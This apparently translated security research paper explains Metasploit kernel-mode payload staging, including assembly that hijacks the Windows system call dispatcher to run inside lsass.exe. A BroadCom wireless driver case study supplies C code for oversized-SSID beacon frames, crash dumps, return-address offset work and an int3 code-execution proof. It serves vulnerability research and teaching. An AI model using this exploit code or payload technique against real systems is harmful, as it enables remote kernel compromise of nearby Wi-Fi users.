作者们为满足这一要求所采取的方法如下。首先，stage 会执行一项检查，意在查看自己是否运行在某个特定进程的上下文中。设置这项检查，是为了帮助确保 stage 本身只在一个已知良好的环境中执行。举例来说，好不容易利用了一个内核模式漏洞，最后却只以 Guest（来宾账户）的权限执行代码，那就太可惜了。默认情况下，这项检查意在查看 stage 是否运行在 lsass.exe 之内——那是一个以 SYSTEM（系统）级权限运行的进程。如果 stage 运行在 lsass 之内，它会再执行一项检查，查看进程环境块（Process Environment Block，即 PEB，每个进程在用户模式下的一块系统数据结构，记录该进程的映像、参数与状态信息）的 SpareBool 属性是否已被置为一。默认情况下，这个值在所有进程中都被初始化为零。如果 SpareBool 属性置为零，那么 stage 接着就把 SpareBool 属性置为一，然后以执行 stage 中余下的所有代码作结。如果 SpareBool 属性置为一——这意味着 stage 已经运行过了——或者它根本不是运行在 lsass 之内，它就把控制权交还给原来的系统调用分发例程。这样做是必要的，因为用户模式进程的系统调用仍然必须得到恰当的分发，否则系统本身就会陷入停顿。下面展示了这份 stage 可能的样子：

```
; Preserve the calling environment
0000003F  60                pusha
00000040  6A30              push byte +0x30
00000042  58                pop eax
00000043  99                cdq
00000044  648B18            mov ebx,[fs:eax]
; Check if Peb->Ldr is NULL
00000047  39530C            cmp [ebx+0xc],edx
0000004A  7426              jz 0x72
; Extract Peb->ProcessParameters->ImagePathName.Buffer
0000004C  8B5B10            mov ebx,[ebx+0x10]
0000004F  8B5B3C            mov ebx,[ebx+0x3c]
; Add 0x28 to the image path name (skip past c:\windows\system32\)
00000052  83C328            add ebx,byte +0x28
; Compare the name of the executable with lass
00000055  8B0B              mov ecx,[ebx]
00000057  034B03            add ecx,[ebx+0x3]
0000005A  81F96C617373      cmp ecx,0x7373616c
; If it doesn't match, execute the original system call dispatcher
00000060  7510              jnz 0x72
00000062  648B18            mov ebx,[fs:eax]
00000065  43                inc ebx
00000066  43                inc ebx
00000067  43                inc ebx
; Check if Peb->SpareBool is 1, if it is, execute the original
; system call dispatcher
00000068  803B01            cmp byte [ebx],0x1
0000006B  7405              jz 0x72
; Set Peb->SpareBool to 1
0000006D  C60301            mov byte [ebx],0x1
; Jump into the continuation stage
00000070  EB07              jmp short 0x79
; Restore the calling environment and execute the original system call
; dispatcher that was preserved in 0x7ffe0308
00000072  61                popa
00000073  FF250803FE7F      jmp near [0x7ffe0308]

; continuation of the stage
```

> 译注：上面代码中注释 `Compare the name of the executable with lass` 的 `lass` 系原文如此，所比较的常量 `0x7373616c` 对应的也正是字符串 `lass`（即 `lsass` 去掉首字母 `s` 后的片段，与代码跳过映像路径前缀的取法相配合），照原文录入，不擅自改动。

这三个载荷组件合在一起，就构成了一份功能完整的载荷，可用于任何在 Idle 线程（Idle thread，即空闲线程，处理器无事可做时运行的那个特殊内核线程）上下文中触发利用的情形。如果利用是在 Idle 线程上下文之外触发的，恢复组件可以换成一种替代方法，而载荷的其余部分可以保持不变。这正是把内核模式载荷拆分成不同组件的好处之一。回顾一下：这份载荷的工作方式是，用一个 stager 把一份 stage 复制进 SharedUserData（共享用户数据页，即在用户模式与内核模式之间共享的那个物理页）中一处未使用的区域。然后 stager 把 SystemCall 属性指向那处未使用的区域，实际上就使得所有用户模式进程在试图发起系统调用时都要先经过这份 stage 跳转一次。stager 完成之后，恢复组件把 IRQL（Interrupt Request Level，中断请求级别，即 Windows 用来表示当前处理器执行优先级的等级，决定哪些中断与代码可以抢占当前执行）恢复到 DISPATCH（分发级，DISPATCH_LEVEL，即 IRQL 的一个等级，在此等级上运行线程调度与 DPC），然后重新启动 Idle 线程。至此，载荷的内核模式部分就完成了。此后不久，被复制到 SharedUserData 的那份 stage 就会在某个特定用户模式进程（例如 lsass.exe）的上下文中得到执行。一旦发生这种情况，stage 就设置一个标志，表明自己已被执行过，然后完成。全部算下来，这份载荷本身只有 115 字节，这还不包括 stage 中的任何附加代码。

有了这一整套基础设施工作，要把几乎任何用户模式载荷插入这份 stage 中都变得微不足道。附加代码只需简单地放在那个已经验证过「它正运行在某个特定进程中、并且此前尚未被执行过」的位置上即可。它之所以如此简单，完全是刻意为之的。实现这套载荷系统的一个主要目标，就是要让人们能够把 Metasploit 框架（Metasploit Framework，一个开源的漏洞利用开发与执行框架）中现有的那一整套载荷，与任何内核模式利用结合起来使用。这甚至包括一些更强大的载荷，例如 Meterpreter（Metasploit 的高级多功能载荷，可在目标上提供交互式命令执行等能力）和 VNC（Virtual Network Computing，虚拟网络计算，一种远程桌面协议）注入。

把内核模式载荷集成进 Metasploit Framework 3.0 版，涉及两个关键要素。第一个要素，是定义利用开发者在编写内核模式利用时需要使用的接口。第二个要素，则是定义最终用户在使用内核模式利用时需要了解的接口（译注：原文此处作 `delt`，系 `dealt` 之笔误，译文按 `dealt with` 的原意译出）。就先后次序而言，先定义编程层面的接口是理想的做法。就这一点而言，最终定下的编程接口应该相当易于使用。选择一个内核模式载荷所涉及的复杂性，大部分都对开发者隐藏了起来。开发者只需要知道少数几件基本的事情。

在 Metasploit 3.0 中实现一个内核模式利用时，必须包含 Msf::Exploit::KernelMode mixin（mixin，即混入模块，Ruby 中把一个模块的功能混入类中以复用代码的机制）。这个 mixin 向框架提供提示，使框架意识到：与这个利用一起使用的任何载荷，都需要被恰当地封装在一个内核模式 stager 之内。仅凭这一个简单的动作，与内核模式载荷相关的大部分工作就从开发者那里被抽象掉了。开发者可能还需要处理的其他要素，只有定义扩展参数这一过程——这些参数用来进一步控制选择内核模式载荷各个方面的过程。这些可控制的参数（译注：原文此处作 `controlable`，系 `controllable` 之笔误，译文按原意译出），是通过一个利用的全局或针对特定目标的 Payload 选项中的 ExtendedOptions 哈希（hash，即哈希表/关联数组，Ruby 中以键值对组织数据的结构）元素，向开发者暴露出来的。下面可以看到，这样一个例子在一个利用中可能是什么样子：

```
'Payload'  =>
{
   'ExtendedOptions' =>
   {
      'Stager'            => 'sud_syscall_hook',
      'Recovery'          => 'idlethread_restart',
      'KiIdleLoopAddress' => 0x804dbb27,
   }
}
```

在上面的例子中，这个利用通过指定 Stager 哈希元素，显式地选定了应当使用的底层 stager 组件。sud_syscall_hook stager（译注：原文在后文叙述与选项清单中又写作 `sudsyscallhook`，指同一个 stager，名称写法前后不一，译文在引述原文名称处分别照录）是第 4.1 节所描述的那个 stager 的符号名。上面的例子还让这个利用显式地选定了应当使用的恢复组件。在这个例子中，被选中的恢复组件是 idlethread_restart（译注：原文在后文叙述与选项清单中又写作 `idlethreadrestart`，指同一个恢复组件，名称写法前后不一，译文在引述原文名称处分别照录），它是前文所描述的那个恢复组件的符号名。此外，还指定了 nt!KiIdleLoop 的地址，供这个特定的恢复组件使用。在底层，KernelMode mixin 与这些附加扩展选项的使用，会使框架把最终用户指定的任何用户模式载荷封装进一个内核模式 stager 之内。归根结底，这一过程对开发者和最终用户双方都是完全透明的。

虽然可以肯定，扩展选项哈希中可以指定的选项集合将来还会增长，但至少把本文写作时已定义的那一组元素记录下来是有意义的。这些选项包括：

Recovery：定义在生成内核模式载荷时应当使用的恢复组件。这个选项当前的一组有效值包括 spin（它会让当前线程自旋，即原地循环等待）、idlethreadrestart（它会重新启动 Idle 线程），或者 default（等同于 spin）。随着时间的推移，可能会加入更多的恢复方法。它们可以在 recovery.rb 中找到。

RecoveryStub：定义一个自定义的恢复组件。

Stager：定义在生成内核模式载荷时应当使用的 stager 组件。这个选项当前的一组有效值包括 sudsyscallhook。随着时间的推移，可能会加入更多的 stager 方法。它们可以在 stager.rb 中找到。

UserModeStub：定义应当作为 stage 的一部分执行的、用户模式的自定义代码。

RunInWin32Process：目前仅适用于 sudsyscallhook stager。这个元素指定应当被注入的那个系统进程的名称，例如 lsass.exe。

KiIdleLoopAddress：目前仅适用于 idlethreadrestart 恢复组件。这个元素指定 nt!KiIdleLoop 的地址。

虽然对开发者或最终用户来说这并不是特别重要，但对某些人而言，了解这一抽象在内部是如何工作的，或许会很有意思。首先，KernelMode mixin 重写了一个名为 encodebegin 的基类方法（译注：原文作 `encodebegin`，照录）。当一个被某个利用所使用的载荷正在被编码时，这个方法会被调用。发生这种情况时，这个 mixin 会声明一个由载荷编码器（payload encoder，即负责对载荷进行编码变换的组件）调用的过程。反过来，这个过程又由载荷编码器在封装那份已预先编码好的载荷的上下文中调用。这个过程本身会被传入原始的、未经加工的用户模式载荷，以及载荷选项哈希（其中包含该利用中指定的扩展选项，如果有的话）。它利用这些信息来构造那个用来封装用户模式载荷的内核模式 stager。如果这个过程成功完成，它会返回一个非 nil（nil，即 Ruby 中的空值，表示「无」）的缓冲区，其中包含着已被封装进一个内核模式 stager 之内的原始用户模式载荷。内核模式 stager 及其他组件，实际上都包含在 Rex 库（Rex，即 Ruby Extension Library，Metasploit 所依赖的 Ruby 扩展库）的 payloads 子系统之中，位于 lib/rex/payloads/win32/kernel 之下。

## 5) Case Studies（案例研究）

本章描述作者在真实世界中的 802.11 无线设备驱动程序（wireless device driver，即负责控制无线网卡硬件、处理 802.11 协议数据包的内核态驱动）里发现的三个彼此独立的漏洞。这三个问题都是通过模糊测试（fuzzing，即向程序喂入大量随机或半随机畸形输入以触发异常的方法）与人工分析相结合的方式发现的。

### 5.1) BroadCom（博通）

本文所述流程所针对的第一个漏洞，是在 BroadCom（博通公司，一家无线芯片与网卡厂商）的无线设备驱动程序中发现的一个问题。这个漏洞由 Chris Eagle 发现，起因是他对逆向分析（reversing，即逆向工程，分析已编译的二进制代码以理解其内部逻辑）内核态代码（kernel-mode code，运行在操作系统内核空间、拥有最高权限的代码）产生了兴趣。Chris 注意到，BroadCom 设备驱动程序处理信标包（beacon packet，802.11 管理帧的一种，由接入点周期性广播，用于宣告无线网络的存在及其参数）的方式中，似乎存在一个常规的栈溢出（stack overflow，即向栈上固定大小的缓冲区写入超过其容量的数据，从而覆盖相邻的栈数据，包括保存的返回地址）。基于这一线索，作者编写了一个简单的程序，生成带有超大尺寸 SSID 的信标包。用于完成此事的代码如下所示：

```
int main(int argc, char **argv)
{
   Packet_80211 BeaconPacket;

   CreatePacketForExploit(BeaconPacket, basic_target);

   printf("Looping forever, sending packets.\n");

   while(true)
   {
      int ret = Send80211Packet(&in_tx, BeaconPacket);
      usleep(cfg.usleep);
      if (ret == -1)
      {
         printf("Error tx'ing packet. Is interface up?\n");
         exit(0);
      }
   }
}

void CreatePacketForExploit(Packet_80211 &P, struct target T)
{
   Packet_80211_mgmt Beacon;
   u_int8_t bcast_addy[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
   Packet_80211_mgmt_Crafter MgmtCrafter(bcast_addy, cfg.src, cfg.bssid);
   MgmtCrafter.craft(8, Beacon); // 8 = beacon
   P = Beacon;
   printf("\n");

   if (T.payload_size > 255)
   {
      printf("invalid target. payload sizes > 255 wont fit in a single IE\n");
      exit(0);
   }

   u_int8_t fixed_parameters[12] = { 
      '_', ',', '.', 'j', 'c', '.', ',', '_', // timestamp (8 bytes)
       0x64, 0x00, // beeacon interval, 1.1024 secs
       0x11, 0x04  // capability information. ESS, WEP, Short slot time
   }; 

   P.AppendData(sizeof(fixed_parameters), fixed_parameters);

   u_int8_t SSID_ie[257]; //255 + 2 for type, value
   u_int8_t *SSID = SSID_ie + 2;

   SSID_ie[0] = 0;
   SSID_ie[1] = 255;

   memset(SSID, 0x41, 255);

   //Okay, SSID IE is ready for appending. 
   P.AppendData(sizeof(SSID_ie), SSID_ie);
   P.print_hex_dump();
}
```

> 译注：上面代码中注释 `beeacon interval` 的 `beeacon` 系原文笔误，应为 `beacon`（信标），照原文录入，不擅自改动。

运行这段代码的结果是，确实产生了包含超大尺寸 SSID（Service Set Identifier，服务集标识符，即无线网络的名称，在 802.11 帧中以信息元素形式携带）的 802.11 信标包。然而，这些数据包似乎对 BroadCom 设备驱动程序没有产生任何效果。在相当一番苦思冥想、抓耳挠腮之后，作者对程序做了一处修改，想看看一个正常尺寸的 SSID 是否会使设备驱动程序去处理它。如果它被处理了，那就意味着这个伪造的 SSID 会出现在可用网络列表中。即使做了这一修改之后，设备驱动程序仍然似乎没有在处理这些手工构造的 802.11 信标包。最后，作者意识到，该驱动程序中可能设置了某种检查，使得它只会处理那些同时也会响应 802.11 探测请求（probe，即探测帧，客户端用于主动发现周边无线网络的机制）的网络所发出的信标包。为了验证这一理论，代码按如下所示的方式做了修改：

```
CreatePacketForExploit(BeaconPacket, basic_target);

//CreatePacket returns a beacon, we will also send out directd probe responses.
Packet_80211 ProbePacket = BeaconPacket;

ProbePacket.wlan_header->subtype = 5; //probe response. 
ProbePacket.setDstAddr(cfg.dst);

...

while(true)
{
   int ret = Send80211Packet(&in_tx, BeaconPacket);
   usleep(cfg.usleep);
   ret = Send80211Packet(&in_tx, ProbePacket);
   usleep(2*cfg.usleep);
}
```

> 译注：上面代码注释 `directd probe responses` 中的 `directd` 系原文笔误，应为 `directed`（定向的），照原文录入，不擅自改动。

同时发送定向探测响应（directed probe response，即针对特定客户端的探测请求所作出的单播响应帧）以及信标包，立刻就产生了结果。当发送一个较小的 SSID 时，它会突然出现在可用无线网络列表中。当发送一个超大尺寸的 SSID 时，则如愿以偿地导致了一次蓝屏（bluescreen，即 Windows 的蓝屏死机，内核遇到无法恢复的错误时显示的停止错误界面），其原因正是 Chris 所发现的那个栈溢出。下面这段输出展示了与发送一个由 255 个 `0xCC` 组成的 SSID 相关的部分崩溃信息：

```
DRIVER_IRQL_NOT_LESS_OR_EQUAL (d1)
An attempt was made to access a pageable (or completely invalid) address at an
interrupt request level (IRQL) that is too high.  This is usually
caused by drivers using improper addresses.
If kernel debugger is available get stack backtrace.
Arguments:
Arg1: ccccfe9d, memory referenced
Arg2: 00000002, IRQL
Arg3: 00000000, value 0 = read operation, 1 = write operation
Arg4: f6e713de, address which referenced memory
...
TRAP_FRAME:  80550004 -- (.trap ffffffff80550004)
ErrCode = 00000000
eax=cccccccc ebx=84ce62ac ecx=00000000 edx=84ce62ac esi=805500e0 edi=84ce6308
eip=f6e713de esp=80550078 ebp=805500e0 iopl=0         nv up ei pl zr na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246
bcmwl5+0xf3de:
f6e713de f680d131000002  test    byte ptr [eax+31D1h],2     ds:0023:ccccfe9d=??
...
kd> k v
  *** Stack trace for last set context - .thread/.cxr resets it
ChildEBP RetAddr  Args to Child              
WARNING: Stack unwind information not available. Following frames may be wrong.
805500e0 cccccccc cccccccc cccccccc cccccccc bcmwl5+0xf3de
80550194 f76a9f09 850890fc 80558e80 80558c20 0xcccccccc
805501ac 804dbbd4 850890b4 850890a0 00000000 NDIS!ndisMDpcX+0x21 (FPO: [Non-Fpo])
805501d0 804dbb4d 00000000 0000000e 00000000 nt!KiRetireDpcList+0x46 (FPO: [0,0,0])
805501d4 00000000 0000000e 00000000 00000000 nt!KiIdleLoop+0x26 (FPO: [0,0,0])
```

在这一情形中，崩溃发生的原因是：栈上的一个变量被覆盖，而该变量随后被用作一个指针。这个被覆盖的指针随后被解引用（dereference，即按照指针所保存的地址去访问其指向的内存）。在这一情形中，解引用是通过 `eax` 寄存器发生的。虽然崩溃是解引用的结果，但重要的是要注意，栈帧（stack frame，即一次函数调用在栈上所占用的区域，包含局部变量、保存的寄存器与返回地址）的返回地址已经成功地被覆盖为一个受控值 `0xcccccccc`。如果该函数被允许干净地返回、而不去尝试解引用已被破坏的指针，那么本可以完全控制指令指针（instruction pointer，即 `eip` 寄存器，决定 CPU 下一条执行哪条指令）。

为了避免这次崩溃并完全控制指令指针，有必要尝试计算从被发送缓冲区的起始处到返回地址之间的偏移量（offset）。算出这一偏移量还有一个好处：可以由此确定触发溢出所需发送的最小字节数。这一点之所以重要，是因为在防止此前所见到的那种解引用崩溃方面，它可能会派上用场。

确定返回地址偏移量的方法有很多种。在当前这种情形下，最简单的做法是发送一个包含递增字节数组的缓冲区。例如，字节下标 0 处是 `0x00`，字节下标 1 处是 `0x01`，以此类推。这样，返回地址被覆盖成的值就可以用来计算其在缓冲区内的偏移。在发送了一个运用此技巧的数据包之后，产生了如下崩溃：

```
DRIVER_IRQL_NOT_LESS_OR_EQUAL (d1)
An attempt was made to access a pageable (or completely invalid) address at an
interrupt request level (IRQL) that is too high.  This is usually
caused by drivers using improper addresses.
If kernel debugger is available get stack backtrace.
Arguments:
Arg1: 605f902e, memory referenced
Arg2: 00000002, IRQL
Arg3: 00000000, value 0 = read operation, 1 = write operation
Arg4: f73673de, address which referenced memory
...
STACK_TEXT:  
80550004 f73673de badb0d00 84d8b250 80550084 nt!KiTrap0E+0x233
WARNING: Stack unwind information not available. Following frames may be wrong.
805500e0 5c5b5a59 605f5e5d 64636261 68676665 bcmwl5+0xf3de
80550194 f76a9f09 84e9e0fc 80558e80 80558c20 0x5c5b5a59
805501ac 804dbbd4 84e9e0b4 84e9e0a0 00000000 NDIS!ndisMDpcX+0x21
805501d0 804dbb4d 00000000 0000000e 00000000 nt!KiRetireDpcList+0x46
805501d4 00000000 0000000e 00000000 00000000 nt!KiIdleLoop+0x26
```

从这一栈追踪（stack trace，即按调用顺序列出的函数调用链，用于还原崩溃时的执行路径）中可以看出，返回地址被覆盖为 `0x5c5b5a59`。由于 x86 上的字节序（byte-ordering）是小端序（little endian，即低位字节存放在低地址处），因此包含 SSID 的缓冲区内的偏移是 `0x59`。

在知道了返回地址被覆盖处的偏移之后，下一步就变成了弄清楚：应当把将要执行的任意代码（arbitrary code，即攻击者自行构造、意图让目标去执行的代码，常称 shellcode）放在缓冲区中的什么位置。在走这条路线之前，有必要先提供一点关于 802.11 管理包（Management packet）格式的背景知识。管理包将其全部信息编码在标准所称的信息元素（Information Elements，IEs）之中。每个 IE 都有一个一字节的标识符，其后跟随一个一字节的长度，随后再跟随与之关联的 IE 数据。对于熟悉类型-长度-值（Type-Length-Value，TLV，一种以类型字段、长度字段、数值字段依次排列的通用数据编码方式）的人来说，IE 与之大致是同一种东西。基于这一定定义，最大的可能的 IE 是 257 字节（2 字节的开销，加上 255 字节的数据）。

与 IE 相关的尺寸限制所带来的结果是：能够被复制到栈上的最大的可能的 SSID 是 255 字节。在尝试寻找栈上返回地址偏移时，发送的是一个带有 255 字节 SSID 的 SSID IE。考虑到栈溢出确实发生了，人们可能会合理地预期：作为所发生溢出的结果，整个 255 字节的 SSID 都能在栈上找到。用一次快速的栈转储（dump，即把一段内存的原始内容按地址罗列出来查看）就可以验证这一假设：

```
kd> db esp L 256
80550078  2e f0 d9 84 0c 80 d8 84-00 80 d8 84 00 07 0e 01  ................
80550088  02 03 ff 00 01 02 03 04-05 06 07 08 09 0a 0b 0c  ................
80550098  0d 0e 0f 10 11 12 13 14-15 16 17 18 19 1a 1b 1c  ................
805500a8  1d 1e 1f 20 21 22 23 24-25 26 0b 28 0c 00 00 00  ... !"#$%&.(....
805500b8  82 84 8b 96 24 30 48 6c-0c 12 18 60 44 00 55 80  ....$0Hl...`D.U.
805500c8  3d 3e 3f 40 41 42 43 44-45 46 01 02 01 02 4b 4c  =>?@ABCDEF....KL
805500d8  4d 01 02 50 51 52 53 54-55 56 57 58 59 5a 5b 5c  M..PQRSTUVWXYZ[\
805500e8  5d 5e 5f 60 61 62 63 64-65 66 67 68 69 6a 6b 6c  ]^_`abcdefghijkl
805500f8  6d 6e 6f 70 71 72 73 74-75 76 77 78 79 7a 7b 7c  mnopqrstuvwxyz{|
80550108  7d 7e 7f 80 81 82 83 84-85 86 87 88 89 8a 8b 8c  }~..............
80550118  8d 8e 8f 90 91 92 93 94-95 96 97 98 99 9a 9b 9c  ................
80550128  9d 9e 9f a0 a1 a2 a3 a4-a5 a6 a7 a8 a9 aa ab ac  ................
80550138  ad ae af b0 b1 b2 b3 b4-b5 b6 b7 b8 b9 ba bb bc  ................
80550148  bd be bf c0 c1 c2 c3 c4-c5 c6 c7 c8 c9 ca cb cc  ................
80550158  cd ce cf d0 d1 d2 d3 d4-d5 d6 d7 d8 d9 da db dc  ................
80550168  dd de df e0 e1 e2 e3 e4-e5 e6 e7 e8 e9 ea eb ec  ................
80550178  ed ee ef f0 f1 f2 f3 f4-f5 f6 f7 f8 f9 fa fb fc  ................
80550188  fd fe e9 84 00 00 00 00-e0 9e 6a 01 ac 01 55 80  ..........j...U.
```

基于这一转储，看起来 SSID 的大部分内容确实被跨栈复制了过来。然而，在返回地址偏移之前的那一大段缓冲区已经被搅乱（mangled，即内容被改写、破坏，不再保持原样）了。在这一实例中，返回地址似乎位于 `0x805500e4`。虽然该地址之前的区域看起来已被搅乱，但其之后的区域却保持完好无损。

# 《利用 Windows 上的 802.11 无线驱动漏洞》第 6 片中文全译

> 译文范围：原文第 1051–1280 行（5.1 BroadCom 案例后半：IE 信息元素布局、偏移确定、findpattern／寄存器分析等，直至 5.1 结束）
> 说明：正文说明文字译为中文；信息元素（Information Element，IE，802.11 管理帧中以「类型＋长度＋值」形式携带参数的字段）布局图、缓冲区结构图、调试输出、寄存器值与数值保持原文；代码、图示与转储块用代码围栏逐字照录。

为了尝试证明获得代码执行的可能性，一个很好的初步尝试是：发送一个缓冲区，用紧随其后那个地址（该地址处的内容将由 `int3` 组成）覆写返回地址。如果一切按计划进行，存在漏洞的函数将返回到这些 `int3` 之中，并以受控的方式使机器蓝屏（bluescreen，即 Windows 内核遇到无法恢复的错误时显示蓝屏并停机）。这样做能达成两件事。第一，它证明了把执行重定向到一个可控缓冲区中是可能的。第二，它给出了执行控制被重定向那一刻寄存器状态的快照。需要发送以触发这一情形的缓冲区布局，如下图所示：

```
[Padding.......][EIP][payload of int3's]
 ^               ^    ^
 |               |    \_ Can hold at most 163 bytes of arbitrary code.
 |               \_ Overwritten with 0x8055010d which points to the payload
 \_ Start of SSID that is mangled after the overflow occurs.
```

图注译文：`[填充……][EIP][由 int3 构成的载荷]`；填充之后是被覆写的 EIP（Extended Instruction Pointer，扩展指令指针寄存器，此处指栈上保存的返回地址）；载荷部分最多可容纳 163 字节的任意代码；EIP 被覆写为 `0x8055010d`，它指向载荷；最左侧是 SSID（Service Set Identifier，服务集标识符，即无线网络名称）的起始处，溢出发生后该处内容会被破坏（mangled）。

发送一个按上图所示结构构造的缓冲区，确实会导致蓝屏。可以查看蓝屏错误检查（bugcheck，即内核的错误检查／蓝屏停机码）信息，来区分真正的崩溃与由 `int3` 导致的崩溃。使用 `int3` 将导致一个未处理的内核模式异常，其 bugcheck 代码为 `0x8e`。此外，与之关联的异常代码信息（即异常的第一个参数）将被设为 `0x80000003`。异常代码 `0x80000003` 用于指示该未处理异常与一条陷阱指令（trap instruction）相关。这通常是一个很好的迹象，表明你所指定的任意代码已经执行。在无法进行远程内核调试、必须完全依赖崩溃转储（crash dump，系统崩溃时保存的内存快照文件）分析的场合，这也非常有用。

```
KERNEL_MODE_EXCEPTION_NOT_HANDLED (8e)
This is a very common bugcheck.  Usually the exception address pinpoints
the driver/function that caused the problem.  Always note this address
as well as the link date of the driver/image that contains this address.
Some common problems are exception code 0x80000003.  This means a hard
coded breakpoint or assertion was hit, but this system was booted
/NODEBUG.  This is not supposed to happen as developers should never have
hardcoded breakpoints in retail code, but ...
If this happens, make sure a debugger gets connected, and the
system is booted /DEBUG.  This will let us see why this breakpoint is
happening.
Arguments:
Arg1: 80000003, The exception code that was not handled
Arg2: 8055010d, The address that the exception occurred at
Arg3: 80550088, Trap Frame
Arg4: 00000000
...
TRAP_FRAME:  80550088 -- (.trap ffffffff80550088)
ErrCode = 00000000
eax=8055010d ebx=841b0000 ecx=00000000 edx=841b31f4 esi=841b000c edi=845f302e
eip=8055010e esp=805500fc ebp=8055010d iopl=0         nv up ei pl zr na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000246
nt!KiDoubleFaultStack+0x2c8e:
8055010e cc              int     3
...
STACK_TEXT:  
8054fc50 8051d6a7 0000008e 80000003 8055010d nt!KeBugCheckEx+0x1b
80550018 804df235 80550034 00000000 80550088 nt!KiDispatchException+0x3b1
80550080 804df947 8055010d 8055010e badb0d00 nt!CommonDispatchException+0x4d
80550080 8055010e 8055010d 8055010e badb0d00 nt!KiTrap03+0xad
8055010d cccccccc cccccccc cccccccc cccccccc nt!KiDoubleFaultStack+0x2c8e
WARNING: Frame IP not in any known module. Following frames may be wrong.
80550111 cccccccc cccccccc cccccccc cccccccc 0xcccccccc
80550115 cccccccc cccccccc cccccccc cccccccc 0xcccccccc
80550119 cccccccc cccccccc cccccccc cccccccc 0xcccccccc
8055011d cccccccc cccccccc cccccccc cccccccc 0xcccccccc
```

上述崩溃转储信息明确表明，任意代码执行已经实现。这是一个重要的里程碑。它基本上证明了利用将是可能的。然而，它并不能证明利用会有多可靠、或者可移植性如何。出于这个原因，下一步要做的是找出对利用所做的那些能使它更可靠、并能从一台机器移植到另一台机器的改动。幸运的是，当前的情况看起来已经可能提供相当好的可移植性，因为栈地址看起来并不会在一次又一次崩溃之间四处漂移。

在这个阶段，返回地址被覆写为一个硬编码的栈地址，它指向缓冲区中紧接在返回地址之后的位置。这种做法的问题之一是：紧跟在返回地址之后的空间量，受 SSID IE 最大尺寸的限制，只能有 163 字节。这点空间足够放下一小段载荷桩代码（stub，一小段起跳转／衔接作用的代码），但很可能不够大，容不下一个能在功能上提供任何有趣东西的载荷。还值得注意的是，覆写到返回地址之外，可能会覆写栈上的一些重要元素，从而可能导致系统在稍后某个时刻以难以解释的原因崩溃。在处理内核模式漏洞时，建议尽可能少地破坏状态，以减少可能随之而来的附带损害（collateral damage）。

把溢出中使用的数据量限制为仅够触发覆写返回地址所需的数据量，意味着 SSID IE 的总尺寸将受到限制，不适合容纳任意代码。然而，完全没有理由不能把代码放在一个与 SSID 完全无关的、单独的 IE 中。这意味着我们可以发送一个数据包，其中既包含那个虚假的 SSID IE，也包含另一个将被用来容纳任意代码的任意 IE。虽然这样做行得通，但必须能够找到一个指向那个包含任意代码的任意 IE 的引用。可以采取的一种做法是，在地址空间中搜索所发送的那个 802.11 数据包的一份完好副本。在走那条路之前，先用内核调试器（kernel debugger）在内存中寻找该数据包的实例，是有道理的。用所发送数据包的目的 MAC 地址（Media Access Control address，介质访问控制地址，即网卡的硬件地址）在地址空间中做一次简单搜索，是寻找潜在匹配的好办法。在本例中，目的 MAC 是 `00:14:a5:06:8f:e6`。

```
kd> .ignore_missing_pages 1
Suppress kernel summary dump missing page error message
kd> s 0x80000000 L?10000000 00 14 a5 06 8f e6
8418588a  00 14 a5 06 8f e6 ff ff-ff ff ff ff 40 0e 00 00  ............@...
841b0006  00 14 a5 06 8f e6 00 00-00 00 00 00 00 00 00 00  ................
841b1534  00 14 a5 06 8f e6 00 00-00 00 00 00 00 00 00 00  ................
84223028  00 14 a5 06 8f e6 00 07-0e 01 02 03 00 07 0e 01  ................
845dc028  00 14 a5 06 8f e6 00 07-0e 01 02 03 00 07 0e 01  ................
845de828  00 14 a5 06 8f e6 00 07-0e 01 02 03 00 07 0e 01  ................
845df828  00 14 a5 06 8f e6 00 07-0e 01 02 03 00 07 0e 01  ................
845f3028  00 14 a5 06 8f e6 00 07-0e 01 02 03 00 07 0e 01  ................
845f3828  00 14 a5 06 8f e6 00 07-0e 01 02 03 00 07 0e 01  ................
845f4028  00 14 a5 06 8f e6 00 07-0e 01 02 03 00 07 0e 01  ................
845f5028  00 14 a5 06 8f e6 00 07-0e 01 02 03 00 07 0e 01  ................
84642d4c  00 14 a5 06 8f e6 00 00-f0 c6 2a 85 00 00 00 00  ..........*.....
846d6d4c  00 14 a5 06 8f e6 00 00-80 79 21 85 00 00 00 00  ..........y!.....
84eda06c  00 14 a5 06 8f e6 02 06-01 01 00 0e 00 00 00 00  ................
84efdecc  00 14 a5 06 8f e6 00 00-65 00 00 00 16 00 25 0a  ........e.....%.
```

上述输出显示，找到了相当多的匹配项。这里需要重点注意的一件事是：那个包含超大 SSID 的数据包中所使用的 BSSID（Basic Service Set Identifier，基本服务集标识符，通常即接入点的 MAC 地址）是 `00:07:0e:01:02:03`。在一个 802.11 头部中，管理（Management）类数据包的地址按 DST（destination，目的地址）、SRC（source，源地址）、BSSID 的顺序排列。上述匹配项中虽然有些看起来并不包含完整的数据包内容，但其中许多确实包含。随机挑选一个匹配项，可以更详细地查看其内容：

```
kd> db 84223028 L 128
84223028  00 14 a5 06 8f e6 00 07-0e 01 02 03 00 07 0e 01  ................
84223038  02 03 d0 cf 85 b1 b3 db-01 00 00 00 64 00 11 04  ............d...
84223048  00 ff 4a 0d 01 55 80 0d-01 55 80 0d 01 55 80 0d  ..J..U...U...U..
84223058  01 55 80 0d 01 55 80 0d-01 55 80 0d 01 55 80 0d  .U...U...U...U..
84223068  01 55 80 0d 01 55 80 0d-01 55 80 0d 01 55 80 0d  .U...U...U...U..
84223078  01 55 80 0d 01 55 80 0d-01 55 80 0d 01 55 80 0d  .U...U...U...U..
84223088  01 55 80 0d 01 55 80 0d-01 55 80 0d 01 55 80 0d  .U...U...U...U..
84223098  01 55 80 0d 01 55 80 0d-01 55 80 0d 01 55 80 0d  .U...U...U...U..
842230a8  01 55 80 cc cc cc cc cc-cc cc cc cc cc cc cc cc  .U..............
842230b8  cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc  ................
842230c8  cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc  ................
842230d8  cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc  ................
842230e8  cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc  ................
842230f8  cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc  ................
84223108  cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc  ................
```

